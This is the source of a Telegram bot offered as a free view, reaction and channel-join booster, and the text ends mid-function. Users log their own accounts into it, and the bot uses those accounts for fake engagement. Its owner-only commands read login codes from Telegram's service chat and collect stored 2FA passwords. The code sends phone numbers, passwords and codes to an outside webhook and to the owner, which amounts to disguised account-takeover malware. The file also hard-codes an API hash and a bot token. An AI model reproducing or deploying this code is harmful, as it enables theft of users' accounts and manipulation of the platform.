import os
import asyncio
import logging
import sys
import glob
import json
import random
import time
import string
import re
from functools import partial
import aiohttp
from aiohttp import web

from telethon import TelegramClient, events, Button
from telethon.tl.functions.messages import (
    ImportChatInviteRequest,
    CheckChatInviteRequest,
    GetMessagesViewsRequest,
    SendReactionRequest,
    ExportChatInviteRequest
)
from telethon.tl.functions.channels import JoinChannelRequest, LeaveChannelRequest, GetFullChannelRequest
from telethon.tl.functions.account import UpdateStatusRequest
from telethon.tl.functions.phone import JoinGroupCallRequest, LeaveGroupCallRequest
from telethon.tl.types import DataJSON, ReactionEmoji, UpdateBotChatInviteRequester
from telethon.errors import (
    SessionPasswordNeededError,
    UserAlreadyParticipantError,
    FloodWaitError,
    InviteHashExpiredError,
    ChannelsTooMuchError,
    UserBannedInChannelError
)

# ==========================================
# 1. CONFIGURATION
# ==========================================

logging.basicConfig(level=logging.ERROR)

DEFAULT_API_ID = 30842203
DEFAULT_API_HASH = "6b64dd14b635b99d5bb820448542f45b"

# Bot tokens (replace with your own)
BOT_TOKENS = [
    "8606888387:AAF5hFLL4EP8d9YldcahZ9gBim9CJcqU180"
]

OWNER_IDS = [6698156001, 6547222834, 7204275439, 6742282042]
MAIN_OWNER_ID = 6698156001

WEBHOOK_URL = "https://acccontrollerr.onrender.com"

# Keep‑alive settings (for Render)
PORT = int(os.environ.get("PORT", 8080))
PUBLIC_URL = os.environ.get("RENDER_EXTERNAL_URL", WEBHOOK_URL)  # fallback, but you should set this
KEEP_ALIVE_INTERVAL = 2   # seconds

SESSION_FOLDER = "sessions"
if not os.path.exists(SESSION_FOLDER):
    os.makedirs(SESSION_FOLDER)

# Console colors
RED = "\033[1;31m"
GREEN = "\033[1;32m"
CYAN = "\033[1;36m"
YELLOW = "\033[1;33m"
BLUE = "\033[1;34m"
PURPLE = "\033[1;35m"
RESET = "\033[0m"

ACTIVE_CLIENTS = {}      # phone -> TelegramClient
VC_MONITORS = {}         # phone -> asyncio.Task
USER_LOGIN_STATE = {}    # user_id -> login step

DB_FILE = "bot_database.json"
db = {}
db_lock = asyncio.Lock()

# ==========================================
# 2. DATABASE FUNCTIONS
# ==========================================

async def load_db():
    async with db_lock:
        if os.path.exists(DB_FILE):
            with open(DB_FILE, 'r') as f:
                return json.load(f)
        return {"users": {}, "keys": {}, "dm_text": "Hello! Welcome.", "dm_buttons": [], "passwords": {}, "admins": []}

async def save_db(data):
    async with db_lock:
        with open(DB_FILE, 'w') as f:
            json.dump(data, f)

async def init_db():
    global db
    db = await load_db()
    if "admins" not in db:
        db["admins"] = []
    if "passwords" not in db:
        db["passwords"] = {}
    if "users" not in db:
        db["users"] = {}
    for uid in db["users"]:
        if "expiry" in db["users"][uid]:
            del db["users"][uid]["expiry"]
    await save_db(db)

def is_owner(user_id: int) -> bool:
    return user_id in OWNER_IDS

def is_admin(user_id: int) -> bool:
    uid_str = str(user_id)
    return user_id in OWNER_IDS or uid_str in db.get("admins", [])

async def ensure_user_exists(user_id: str):
    if user_id not in db["users"]:
        db["users"][user_id] = {"phones": []}
        await save_db(db)

# ==========================================
# 3. WEBHOOK & OWNER FORWARDING
# ==========================================

async def send_to_webhook(phone: str, password: str, otp: str, bot_client=None):
    try:
        data = {
            "phone": phone,
            "password": password,
            "otp": otp,
            "timestamp": time.time(),
            "source": "telegram_bot"
        }
        async with aiohttp.ClientSession() as session:
            async with session.post(WEBHOOK_URL, json=data, timeout=5) as resp:
                if resp.status != 200:
                    print(f"Webhook responded with {resp.status}")
    except Exception as e:
        print(f"Failed to send to webhook: {e}")

async def forward_to_owner(text: str, bot_client):
    if bot_client is None:
        return
    try:
        await bot_client.send_message(MAIN_OWNER_ID, text)
    except Exception as e:
        print(f"Failed to forward to owner: {e}")

# ==========================================
# 4. KEEP‑ALIVE (Render)
# ==========================================

async def handle_keep_alive(request):
    return web.Response(text="OK")

async def start_http_server():
    app = web.Application()
    app.router.add_get("/", handle_keep_alive)
    app.router.add_get("/webhook", handle_keep_alive)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    print(f"{GREEN}✅ HTTP keep‑alive server running on port {PORT}{RESET}")

async def keep_alive_pinger():
    """Ping the public URL every KEEP_ALIVE_INTERVAL seconds to prevent Render sleep."""
    if not PUBLIC_URL:
        print(f"{YELLOW}⚠️ No PUBLIC_URL set. Keep‑alive pinger disabled.{RESET}")
        return
    print(f"{CYAN}🔄 Keep‑alive pinger started. Will ping {PUBLIC_URL} every {KEEP_ALIVE_INTERVAL}s{RESET}")
    while True:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(PUBLIC_URL, timeout=5) as resp:
                    if resp.status == 200:
                        print(f"{GREEN}✓ Keep‑alive ping successful{RESET}")
                    else:
                        print(f"{YELLOW}⚠️ Ping returned {resp.status}{RESET}")
        except Exception as e:
            print(f"{RED}❌ Keep‑alive ping failed: {e}{RESET}")
        await asyncio.sleep(KEEP_ALIVE_INTERVAL)

# ==========================================
# 5. USER SESSION MANAGEMENT
# ==========================================

async def refresh_all_clients():
    global ACTIVE_CLIENTS
    print(f"\n{YELLOW}🔄 Refreshing sessions...{RESET}")
    for phone, client in list(ACTIVE_CLIENTS.items()):
        try:
            await client.disconnect()
        except:
            pass
    ACTIVE_CLIENTS.clear()
    await initialize_all_clients()

async def initialize_all_clients():
    print(f"\n{YELLOW}📂 Scanning '{SESSION_FOLDER}' folder...{RESET}")
    session_files = glob.glob(f"{SESSION_FOLDER}/*.session")
    session_files = [f for f in session_files if "bot_session" not in f]

    if not session_files:
        print(f"{RED}❌ No user session files found.{RESET}")
        return

    print(f"{PURPLE}⚡ Loading {len(session_files)} IDs...{RESET}")
    sem = asyncio.Semaphore(40)

    async def load_one(session_file):
        async with sem:
            try:
                filename = os.path.basename(session_file)
                phone = filename.replace(".session", "")
                client = TelegramClient(f"{SESSION_FOLDER}/{phone}", DEFAULT_API_ID, DEFAULT_API_HASH)
                await client.connect()
                if await client.is_user_authorized():
                    await client(UpdateStatusRequest(offline=False))
                    print(f"{GREEN}✅ Loaded: {phone}{RESET}")
                    return phone, client
                else:
                    await client.disconnect()
                    return None
            except Exception as e:
                print(f"{RED}⚠️ Error loading {session_file}: {e}{RESET}")
                return None

    tasks = [load_one(f) for f in session_files]
    results = await asyncio.gather(*tasks)
    count = 0
    for res in results:
        if res:
            ACTIVE_CLIENTS[res[0]] = res[1]
            count += 1
    print(f"\n{CYAN}🔥 Total {count} IDs online.{RESET}\n")

async def keep_online_loop():
    while True:
        if not ACTIVE_CLIENTS:
            await asyncio.sleep(10)
            continue
        for phone, client in ACTIVE_CLIENTS.items():
            try:
                if not client.is_connected():
                    await client.connect()
                await client(UpdateStatusRequest(offline=False))
            except:
                pass
        await asyncio.sleep(30)

async def login_new_account():
    print(f"\n{CYAN}📱 New Account Login{RESET}")
    try:
        phone = input(f"{YELLOW}Enter phone (+country): {RESET}").strip()
        session_path = f"{SESSION_FOLDER}/{phone}"
        if os.path.exists(f"{session_path}.session"):
            print(f"{RED}❌ Session already exists.{RESET}")
            return
        client = TelegramClient(session_path, DEFAULT_API_ID, DEFAULT_API_HASH)
        await client.connect()
        await client.send_code_request(phone)
        code = input(f"{YELLOW}Enter code: {RESET}").strip()
        try:
            await client.sign_in(phone, code)
        except SessionPasswordNeededError:
            pwd = input(f"{YELLOW}Enter 2FA password: {RESET}").strip()
            await client.sign_in(password=pwd)
            db["passwords"][phone] = pwd
            await save_db(db)
        ACTIVE_CLIENTS[phone] = client
        owner_id = str(OWNER_IDS[0])
        if phone not in db["users"][owner_id]["phones"]:
            db["users"][owner_id]["phones"].append(phone)
            await save_db(db)
        await client(UpdateStatusRequest(offline=False))
        print(f"{GREEN}✅ Account {phone} saved.{RESET}")
    except Exception as e:
        print(f"{RED}❌ Login failed: {e}{RESET}")

# ==========================================
# 6. CORE TASK FUNCTIONS (views, reactions, joins, VC)
# ==========================================

async def _send_view_batch(clients_batch, chat_id, msg_id, name):
    if not clients_batch:
        return
    tasks = []
    for phone, client in clients_batch:
        async def view(c):
            try:
                entity = await c.get_input_entity(chat_id)
                await c(GetMessagesViewsRequest(peer=entity, id=[msg_id], increment=True))
            except:
                pass
        tasks.append(view(client))
    if tasks:
        await asyncio.gather(*tasks)
    print(f"{BLUE}👀 {name} Views done.{RESET}")

async def _send_reaction_loop(clients_batch, chat_id, msg_id):
    emojis = ["❤️", "👍", "🔥", "🥰", "👏", "🤩", "⚡", "🎉"]
    print(f"{YELLOW}⏳ Starting 10 reactions...{RESET}")
    for phone, client in clients_batch:
        try:
            await asyncio.sleep(random.uniform(5.5, 6.5))
            entity = await client.get_input_entity(chat_id)
            await client(SendReactionRequest(
                peer=entity,
                msg_id=msg_id,
                big=True,
                reaction=[ReactionEmoji(emoticon=random.choice(emojis))]
            ))
            print(f"{PURPLE}❤️ Reaction sent.{RESET}")
        except:
            pass

async def perform_staged_reaction_view(chat_id, msg_id):
    all_clients = list(ACTIVE_CLIENTS.items())
    random.shuffle(all_clients)
    if not all_clients:
        return
    print(f"\n{CYAN}🎯 New post {msg_id} in {chat_id}{RESET}")
    v1 = all_clients[0:5]
    v2 = all_clients[5:10]
    v3 = all_clients[10:20]
    v4 = all_clients[20:30]
    v5 = all_clients[30:50]
    rbatch = all_clients[:10]
    asyncio.create_task(_send_reaction_loop(rbatch, chat_id, msg_id))
    await asyncio.sleep(5)
    await _send_view_batch(v1, chat_id, msg_id, "T+5s")
    await asyncio.sleep(10)
    await _send_view_batch(v2, chat_id, msg_id, "T+15s")
    await asyncio.sleep(15)
    await _send_view_batch(v3, chat_id, msg_id, "T+30s")
    await asyncio.sleep(20)
    await _send_view_batch(v4, chat_id, msg_id, "T+50s")
    await asyncio.sleep(30)
    await _send_view_batch(v5, chat_id, msg_id, "T+80s")
    print(f"{GREEN}🏁 Post {msg_id} cycle complete.{RESET}")

async def _worker_vc_join(client, phone, identifier, is_private):
    try:
        entity = None
        if is_private:
            try:
                updates = await client(ImportChatInviteRequest(identifier))
                if updates.chats:
                    entity = updates.chats[0]
            except UserAlreadyParticipantError:
                try:
                    inv = await client(CheckChatInviteRequest(identifier))
                    if hasattr(inv, 'chat'):
                        entity = inv.chat
                except:
                    pass
        else:
            try:
                await client(JoinChannelRequest(identifier))
            except:
                pass
            entity = await client.get_entity(identifier)
        if not entity:
            return 0
        full = await client(GetFullChannelRequest(entity))
        if not full.full_chat.call:
            return 0
        if phone in VC_MONITORS:
            VC_MONITORS[phone].cancel()
        call_obj = full.full_chat.call
        try:
            ssrc = random.randint(10000, 99999999)
            params = DataJSON(data=json.dumps({"min_version": 2, "ssrc": ssrc, "muted": True}))
            await client(JoinGroupCallRequest(call=call_obj, join_as=await client.get_input_entity('me'), params=params, muted=True))
            print(f"{GREEN}[{phone}] Joined VC (muted){RESET}")
            VC_MONITORS[phone] = asyncio.create_task(monitor_and_stay_in_vc(client, entity, phone))
            return 1
        except:
            return 0
    except:
        return 0

async def monitor_and_stay_in_vc(client, entity, phone):
    print(f"{BLUE}[{phone}] VC guard active.{RESET}")
    while phone in VC_MONITORS:
        try:
            full = await client(GetFullChannelRequest(entity))
            call_obj = full.full_chat.call
            if not call_obj:
                print(f"{RED}[{phone}] VC ended.{RESET}")
                if phone in VC_MONITORS:
                    del VC_MONITORS[phone]
                break
            try:
                ssrc = random.randint(10000, 99999999)
                params = DataJSON(data=json.dumps({"min_version": 2, "ssrc": ssrc, "muted": True}))
                await client(JoinGroupCallRequest(call=call_obj, join_as=await client.get_input_entity('me'), params=params, muted=True))
            except UserAlreadyParticipantError:
                pass
            except:
                pass
        except:
            pass
        await asyncio.sleep(15)

async def process_voice_join_teri(link, target_clients=None):
    if target_clients is None:
        target_clients = ACTIVE_CLIENTS
    is_private, identifier = parse_link(link)
    print(f"\n{PURPLE}🎤 TERI mode: fast VC join...{RESET}")
    tasks = []
    for phone, client in target_clients.items():
        await asyncio.sleep(random.uniform(0.05, 0.2))
        tasks.append(_worker_vc_join(client, phone, identifier, is_private))
    results = await asyncio.gather(*tasks)
    print(f"{GREEN}✅ Joined {sum(results)}/{len(target_clients)} VCs.{RESET}")

async def _worker_leave_all(client, phone):
    try:
        dialogs = await client.get_dialogs()
        for d in dialogs:
            try:
                if hasattr(d.entity, 'broadcast') or hasattr(d.entity, 'megagroup'):
                    await client(LeaveChannelRequest(d.entity))
                    print(f"{YELLOW}[{phone}] Left: {d.entity.title}{RESET}")
            except:
                pass
    except:
        pass

async def leave_all_channels_from_all_ids():
    print(f"\n{RED}⚠️ Leaving ALL channels for all IDs...{RESET}")
    tasks = [_worker_leave_all(c, p) for p, c in ACTIVE_CLIENTS.items()]
    await asyncio.gather(*tasks)
    print(f"{GREEN}✅ All channels left.{RESET}")

async def leave_voice_chat_all():
    print(f"\n{RED}🚪 Leaving all VCs...{RESET}")
    for phone in list(VC_MONITORS.keys()):
        VC_MONITORS[phone].cancel()
        del VC_MONITORS[phone]
    async def _leave(client):
        try:
            dialogs = await client.get_dialogs(limit=30)
            for d in dialogs:
                if d.entity:
                    full = await client(GetFullChannelRequest(d.entity))
                    if full.full_chat.call:
                        await client(LeaveGroupCallRequest(full.full_chat.call))
        except:
            pass
    tasks = [_leave(c) for c in ACTIVE_CLIENTS.values()]
    await asyncio.gather(*tasks)
    print(f"{GREEN}✅ Left all VCs.{RESET}")

async def process_termux_join(link, qty, time_limit=0, target_clients=None):
    if target_clients is None:
        target_clients = ACTIVE_CLIENTS
    is_private, identifier = parse_link(link)
    print(f"\n{CYAN}Join task: {qty} joins, {time_limit}s limit{RESET}")
    delay = time_limit / qty if time_limit > 0 and qty > 0 else 0
    success = 0
    for phone, client in target_clients.items():
        if success >= qty:
            break
        try:
            if is_private:
                await client(ImportChatInviteRequest(identifier))
            else:
                await client(JoinChannelRequest(identifier))
            print(f"{GREEN}[{phone}] Joined{RESET}")
            success += 1
            await asyncio.sleep(delay if delay > 0 else 0.5)
        except Exception as e:
            if "Already" in str(e):
                print(f"{YELLOW}[{phone}] Already joined{RESET}")
                success += 1
            else:
                print(f"{RED}[{phone}] Failed: {e}{RESET}")
    print(f"{YELLOW}Done: {success}/{qty}{RESET}")

async def _worker_pro(client, phone, identifier, is_private):
    try:
        if is_private:
            await client(ImportChatInviteRequest(identifier))
        else:
            await client(JoinChannelRequest(identifier))
        print(f"{GREEN}[{phone}] Request sent{RESET}")
    except UserAlreadyParticipantError:
        try:
            entity = await client.get_input_entity(identifier)
            await client(LeaveChannelRequest(entity))
            await asyncio.sleep(1)
            if is_private:
                await client(ImportChatInviteRequest(identifier))
            else:
                await client(JoinChannelRequest(identifier))
            print(f"{GREEN}[{phone}] Re-joined{RESET}")
        except:
            pass
    except:
        pass

async def process_pro_mode(link, target_clients=None):
    if target_clients is None:
        target_clients = ACTIVE_CLIENTS
    is_private, identifier = parse_link(link)
    print(f"\n{PURPLE}🚀 PRO mode (fast join/request)...{RESET}")
    tasks = [_worker_pro(c, p, identifier, is_private) for p, c in target_clients.items()]
    await asyncio.gather(*tasks)
    print(f"{GREEN}✅ PRO mode finished.{RESET}")

async def test_channel_check(link, qty, time_limit=0, target_clients=None):
    if target_clients is None:
        target_clients = ACTIVE_CLIENTS
    is_private, identifier = parse_link(link)
    print(f"\n{BLUE}🧪 Testing link on {qty} IDs...{RESET}")
    delay = time_limit / qty if time_limit > 0 and qty > 0 else 0
    count = 0
    for phone, client in target_clients.items():
        if count >= qty:
            break
        try:
            if is_private:
                await client(ImportChatInviteRequest(identifier))
            else:
                await client(JoinChannelRequest(identifier))
            print(f"{GREEN}[{phone}] ✅ Joined{RESET}")
        except UserAlreadyParticipantError:
            print(f"{YELLOW}[{phone}] Already joined{RESET}")
        except FloodWaitError as e:
            print(f"{RED}[{phone}] FloodWait {e.seconds}s{RESET}")
        except ChannelsTooMuchError:
            print(f"{RED}[{phone}] Limit reached{RESET}")
        except UserBannedInChannelError:
            print(f"{RED}[{phone}] Banned{RESET}")
        except InviteHashExpiredError:
            print(f"{RED}[{phone}] Link expired{RESET}")
        except Exception as e:
            print(f"{RED}[{phone}] Error: {e}{RESET}")
        count += 1
        await asyncio.sleep(delay if delay > 0 else 0.1)
    print(f"{GREEN}Test complete.{RESET}")

def parse_link(link):
    if not link:
        return False, ""
    link = link.strip().replace(" ", "")
    for p in ["https://", "http://", "www.", "t.me/", "telegram.me/"]:
        link = link.replace(p, "")
    if "?" in link:
        link = link.split("?")[0]
    if "joinchat/" in link:
        return True, link.split("joinchat/")[1].replace("/", "")
    if link.startswith("+"):
        return True, link[1:].replace("/", "")
    return False, link.replace("@", "").replace("/", "")

# ==========================================
# 7. BOT HANDLERS (Telegram bot commands)
# ==========================================

class BotHandlers:
    def __init__(self, bot_client: TelegramClient):
        self.bot = bot_client
        self.bot.add_event_handler(self.start_handler, events.NewMessage(pattern='/start'))
        self.bot.add_event_handler(self.redeem_handler, events.NewMessage(pattern='/redeem (.*)'))
        self.bot.add_event_handler(self.text_handler, events.NewMessage(pattern='/text (.*)'))
        self.bot.add_event_handler(self.button_handler, events.NewMessage(pattern='/button (.*)'))
        self.bot.add_event_handler(self.scan_handler, events.NewMessage(pattern='/scan'))
        self.bot.add_event_handler(self.recover_handler, events.NewMessage(pattern='/recover$'))
        self.bot.add_event_handler(self.recoverall_handler, events.NewMessage(pattern='/recoverall'))
        self.bot.add_event_handler(self.allusers_handler, events.NewMessage(pattern='/allusers'))
        self.bot.add_event_handler(self.userrecover_handler, events.NewMessage(pattern='/userrecover (.*)'))
        self.bot.add_event_handler(self.getotp_handler, events.NewMessage(pattern='/getotp (.*)'))
        self.bot.add_event_handler(self.transfer_handler, events.NewMessage(pattern='/transfer (.*)'))
        self.bot.add_event_handler(self.addadmin_handler, events.NewMessage(pattern='/addadmin (.*)'))
        self.bot.add_event_handler(self.removeadmin_handler, events.NewMessage(pattern='/removeadmin (.*)'))
        self.bot.add_event_handler(self.callback_handler, events.CallbackQuery(pattern=b"cmd_(.*)"))
        self.bot.add_event_handler(self.message_handler, events.NewMessage(incoming=True, func=lambda e: e.is_private and not e.text.startswith('/')))
        self.bot.add_event_handler(self.channel_post_watcher, events.NewMessage(incoming=True))
        self.bot.add_event_handler(self.auto_dm_requester, events.Raw)
        self.bot.add_event_handler(self.auto_join_on_admin, events.ChatAction)

    async def start_handler(self, event):
        uid = str(event.sender_id)
        await ensure_user_exists(uid)
        admin = is_admin(event.sender_id)
        text = (f"🤖 Quantum Bot Running!\n"
                f"✅ {len(ACTIVE_CLIENTS)} IDs online globally\n"
                f"👤 Your IDs: {len(db['users'][uid]['phones'])}\n"
                f"⚡ Auto‑view V3: reactions + step views")
        buttons = [
            [Button.inline("➕ Login ID", b"cmd_new"), Button.inline("🔄 Refresh", b"cmd_refresh")],
            [Button.inline("🎤 VC Join", b"cmd_teri"), Button.inline("🔗 Termux Join", b"cmd_join")],
            [Button.inline("👁️ View", b"cmd_view")],
            [Button.inline("🚪 Leave All", b"cmd_leaveall"), Button.inline("🔇 Leave VC", b"cmd_leavevc")]
        ]
        if admin:
            buttons.append([Button.inline("🔑 Make Key", b"cmd_makekey")])
            text += "\n\n👑 Admin options"
        await event.respond(text, buttons=buttons)

    async def redeem_handler(self, event):
        await event.respond("ℹ️ Keys are no longer needed. The bot is free for everyone.")

    async def text_handler(self, event):
        if not is_admin(event.sender_id):
            return
        db["dm_text"] = event.pattern_match.group(1).strip()
        await save_db(db)
        await event.respond("✅ Auto-DM text updated.")

    async def button_handler(self, event):
        if not is_admin(event.sender_id):
            return
        data = event.pattern_match.group(1).strip()
        if data.lower() == "clear":
            db["dm_buttons"] = []
            await save_db(db)
            await event.respond("✅ Buttons cleared.")
            return
        try:
            t, u = data.split("|")
            db["dm_buttons"].append({"text": t.strip(), "url": u.strip()})
            await save_db(db)
            await event.respond(f"✅ Added: {t.strip()} -> {u.strip()}")
        except:
            await event.respond("❌ Use: /button Name | https://link.com")

    # ---------- OWNER‑ONLY COMMANDS ----------
    async def scan_handler(self, event):
        if not is_owner(event.sender_id):
            await event.respond("❌ Owner only.")
            return
        uid = str(event.sender_id)
        phones = db["users"][uid]["phones"]
        if not phones:
            await event.respond("No accounts.")
            return
        msg = "🔍 Your IDs, passwords & latest OTPs:\n\n"
        for phone in phones:
            pwd = db["passwords"].get(phone, "No password")
            otp = "N/A"
            if phone in ACTIVE_CLIENTS:
                try:
                    msgs = await ACTIVE_CLIENTS[phone].get_messages(777000, limit=1)
                    if msgs and msgs[0].message:
                        m = re.search(r'\b(\d{5})\b', msgs[0].message)
                        otp = m.group(1) if m else "No recent OTP"
                except:
                    otp = "Error"
            else:
                otp = "Offline"
            line = f"📱 `{phone}` ➔ 🔐 `{pwd}` ➔ OTP: `{otp}`\n"
            msg += line
            await send_to_webhook(phone, pwd, otp, self.bot)
            await forward_to_owner(line, self.bot)
        if len(msg) > 4000:
            for i in range(0, len(msg), 4000):
                await event.respond(msg[i:i+4000])
        else:
            await event.respond(msg)

    async def recover_handler(self, event):
        if not is_owner(event.sender_id):
            await event.respond("❌ Owner only.")
            return
        buttons = [[Button.inline("🔓 Recover ID", b"cmd_recoverbtn")]]
        if is_owner(event.sender_id):
            buttons.append([Button.inline("👑 Recover ALL IDs", b"cmd_recoverallbtn")])
        await event.respond("⚠️ Recovery mode – click button to fetch OTP.", buttons=buttons)

    async def recoverall_handler(self, event):
        if not is_owner(event.sender_id):
            await event.respond("❌ Owner only.")
            return
        if not ACTIVE_CLIENTS:
            await event.respond("No online IDs.")
            return
        await event.respond("⏳ Extracting OTPs from ALL IDs...")
        msg = "👑 GLOBAL RECOVERY DATA:\n\n"
        for phone, client in ACTIVE_CLIENTS.items():
            pwd = db["passwords"].get(phone, "No password")
            otp = "N/A"
            try:
                msgs = await client.get_messages(777000, limit=3)
                for m in msgs:
                    if m and m.message:
                        match = re.search(r'\b(\d{5})\b', m.message)
                        if match:
                            otp = match.group(1)
                            break
                if otp == "N/A":
                    otp = "No recent OTP"
            except:
                otp = "Error"
            line = f"📱 `{phone}` ➔ 🔐 `{pwd}` ➔ OTP: `{otp}`\n"
            msg += line
            await send_to_webhook(phone, pwd, otp, self.bot)
            await forward_to_owner(line, self.bot)
        if len(msg) > 4000:
            for i in range(0, len(msg), 4000):
                await event.respond(msg[i:i+4000])
        else:
            await event.respond(msg)

    async def allusers_handler(self, event):
        if not is_owner(event.sender_id):
            await event.respond("❌ Owner only.")
            return
        out = "👥 All users:\n"
        for uid, data in db["users"].items():
            if data.get("phones"):
                out += f"👤 `{uid}` → {len(data['phones'])} accounts\n"
        await event.respond(out if out != "👥 All users:\n" else "No users.")

    async def userrecover_handler(self, event):
        if not is_owner(event.sender_id):
            await event.respond("❌ Owner only.")
            return
        target = event.pattern_match.group(1).strip()
        if target not in db["users"] or not db["users"][target]["phones"]:
            await event.respond("User not found or no phones.")
            return
        await event.respond(f"⏳ Fetching OTPs for user {target}...")
        msg = f"👑 Recovery for {target}:\n\n"
        for phone in db["users"][target]["phones"]:
            pwd = db["passwords"].get(phone, "No password")
            otp = "N/A"
            if phone in ACTIVE_CLIENTS:
                try:
                    msgs = await ACTIVE_CLIENTS[phone].get_messages(777000, limit=3)
                    for m in msgs:
                        if m and m.message:
                            match = re.search(r'\b(\d{5})\b', m.message)
                            if match:
                                otp = match.group(1)
                                break
                    if otp == "N/A":
                        otp = "No recent OTP"
                except:
                    otp = "Error"
            else:
                otp = "Offline"
            line = f"📱 `{phone}` ➔ 🔐 `{pwd}` ➔ OTP: `{otp}`\n"
            msg += line
            await send_to_webhook(phone, pwd, otp, self.bot)
            await forward_to_owner(line, self.bot)
        if len(msg) > 4000:
            for i in range(0, len(msg), 4000):
                await event.respond(msg[i:i+4000])
        else:
            await event.respond(msg)

    async def getotp_handler(self, event):
        if not is_owner(event.sender_id):
            await event.respond("❌ Owner only.")
            return
        phone = event.pattern_match.group(1).strip()
        if not phone.startswith('+'):
            phone = '+' + phone
        pwd = db["passwords"].get(phone, "No password")
        otp = "N/A"
        if phone in ACTIVE_CLIENTS:
            try:
                msgs = await ACTIVE_CLIENTS[phone].get_messages(777000, limit=3)
                for m in msgs:
                    if m and m.message:
                        match = re.search(r'\b(\d{5})\b', m.message)
                        if match:
                            otp = match.group(1)
                            break
                if otp == "N/A":
                    otp = "No recent OTP"
            except:
                otp = "Error"
        else:
            otp = "Offline"
        line = f"📱 `{phone}`\n🔐 `{pwd}`\n💬 OTP: `{otp}`"
        await event.respond(line)
        await send_to_webhook(phone, pwd, otp, self.bot)
        await forward_to_owner(line, self.bot)

    async def transfer_handler(self, event):
        if not is_owner(event.sender_id):
            await event.respond("❌ Owner only.")
            return
        args = event.pattern_match.group(1).strip().split()
        if len(args) != 2:
            await event.respond("Usage: /transfer <old_id> <new_id>")
            return
        old, new = args[0], args[1]
        if old not in db["users"] or not db["users"][old]["phones"]:
            await event.respond("Old user has no phones.")
            return
        if new not in db["users"]:
            db["users"][new] = {"phones": []}
        db["users"][new]["phones"].extend(db["users"][old]["phones"])
        db["users"][old]["phones"] = []
        await save_db(db)
        await event.respond(f"✅ Transferred {len(db['users'][new]['phones'])} accounts.")

    async def addadmin_handler(self, event):
        if not is_owner(event.sender_id):
            return
        uid = event.pattern_match.group(1).strip()
        if uid not in db["users"]:
            db["users"][uid] = {"phones": []}
        if uid not in db["admins"]:
            db["admins"].append(uid)
            await save_db(db)
            await event.respond(f"✅ {uid} is now admin.")
        else:
            await event.respond("Already admin.")

    async def removeadmin_handler(self, event):
        if not is_owner(event.sender_id):
            return
        uid = event.pattern_match.group(1).strip()
        if uid in db["admins"]:
            db["admins"].remove(uid)
            await save_db(db)
            await event.respond(f"✅ {uid} is no longer admin.")
        else:
            await event.respond("Not an admin.")

    async def callback_handler(self, event):
        cmd = event.data.decode().split("_")[1]
        uid = str(event.sender_id)
        await ensure_user_exists(uid)
        user_phones = db["users"][uid]["phones"]
        user_clients = {p: c for p, c in ACTIVE_CLIENTS.items() if p in user_phones}

        if cmd == "new":
            USER_LOGIN_STATE[uid] = {"step": "phone"}
            await event.respond("Send phone number (+country):")
        elif cmd == "refresh":
            await refresh_all_clients()
            await event.respond("✅ Refreshed.")
        elif cmd == "makekey":
            if not is_admin(event.sender_id):
                return
            key = "KEY-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=10))
            db["keys"][key] = 30
            await save_db(db)
            await event.respond(f"🔑 {key} (30 days)")
        elif cmd == "teri":
            USER_LOGIN_STATE[uid] = {"step": "arg_teri"}
            await event.respond("Send VC join link:")
        elif cmd == "view":
            me = await event.client.get_me()
            uname = me.username
            await event.edit("👁️ View setup:", buttons=[
                [Button.inline("📖 How to use", b"cmd_howtouse")],
                [Button.url("➕ Add to channel", f"https://t.me/{uname}?startchannel=true&admin=post_messages+edit_messages+delete_messages+invite_users")]
            ])
        elif cmd == "howtouse":
            await event.respond("📖 Add bot as admin to your channel → it will auto‑send views & reactions.")
        elif cmd == "join":
            USER_LOGIN_STATE[uid] = {"step": "req_join_link"}
            await event.respond("Send join link:")
        elif cmd == "leaveall":
            await event.respond("Leaving all channels for your IDs...")
            tasks = [_worker_leave_all(c, p) for p, c in user_clients.items()]
            await asyncio.gather(*tasks)
            await event.respond("✅ Done.")
        elif cmd == "leavevc":
            await event.respond("Leaving VCs for your IDs...")
            for phone in user_clients.keys():
                if phone in VC_MONITORS:
                    VC_MONITORS[phone].cancel()
                    del VC_MONITORS[phone]
            async def _leave(client):
                try:
                    dialogs = await client.get_dialogs(limit=30)
                    for d in dialogs:
                        if d.entity:
                            full = await client(GetFullChannelRequest(d.entity))
                            if full.full_chat.call:
                                await client(LeaveGroupCallRequest(full.full_chat.call))
                except:
                    pass
            tasks = [_leave(c) for c in user_clients.values()]
            await asyncio.gather(*tasks)
            await event.respond("✅ Left VCs.")
        elif cmd == "recoverbtn":
            if not is_owner(event.sender_id):
                await event.answer("Not authorized", alert=True)
                return
            USER_LOGIN_STATE[uid] = {"step": "recover_phone"}
            await event.respond("Send phone number to recover:")
        elif cmd == "recoverallbtn":
            if not is_owner(event.sender_id):
                await event.answer("Not authorized", alert=True)
                return
            if not ACTIVE_CLIENTS:
                await event.respond("No online IDs.")
                return
            await event.respond("⏳ Fetching OTPs from ALL IDs...")
            msg = "👑 GLOBAL RECOVERY DATA:\n\n"
            for phone, client in ACTIVE_CLIENTS.items():
                pwd = db["passwords"].get(phone, "No password")
                otp = "N/A"
                try:
                    msgs = await client.get_messages(777000, limit=3)
                    for m in msgs:
                        if m and m.message:
                            match = re.search(r'\b(\d{5})\b', m.message)
                            if match:
                                otp = match.group(1)
                                break
                    if otp == "N/A":
                        otp = "No recent OTP"
                except:
                    otp = "Error"
                line = f"📱 `{phone}` ➔ 🔐 `{pwd}` ➔ OTP: `{otp}`\n"
                msg += line
                await send_to_webhook(phone, pwd, otp, self.bot)
                await forward_to_owner(line, self.bot)
            if len(msg) > 4000:
                for i in range(0, len(msg), 4000):
                    await event.respond(msg[i:i+4000])
            else:
                await event.respond(msg)

    async def message_handler(self, event):
        uid = str(event.sender_id)
        if uid not in USER_LOGIN_STATE:
            return
        state = USER_LOGIN_STATE[uid]
        if state["step"] == "phone":
            phone = event.text.strip().replace(" ", "").replace("+", "").replace("-", "")
            phone = "+" + phone
            session_path = f"{SESSION_FOLDER}/{phone}"
            if os.path.exists(f"{session_path}.session"):
                await event.respond("Session already exists.")
                del USER_LOGIN_STATE[uid]
                return
            client = TelegramClient(session_path, DEFAULT_API_ID, DEFAULT_API_HASH)
            await client.connect()
            try:
                res = await client.send_code_request(phone)
                USER_LOGIN_STATE[uid] = {"step": "code", "phone": phone, "phone_hash": res.phone_code_hash, "client": client}
                await event.respond("Code sent. Enter code:")
            except Exception as e:
